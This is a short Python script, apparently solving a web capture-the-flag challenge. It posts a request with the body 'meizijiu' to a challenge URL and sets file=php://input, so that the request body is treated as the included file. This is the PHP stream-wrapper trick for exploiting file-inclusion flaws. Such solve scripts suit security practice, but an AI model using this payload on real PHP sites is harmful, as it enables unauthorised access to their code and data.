import requests
res = requests.post("http://chinalover.sinaapp.com/web23/?file=php://input",data='meizijiu')
print(res.content)
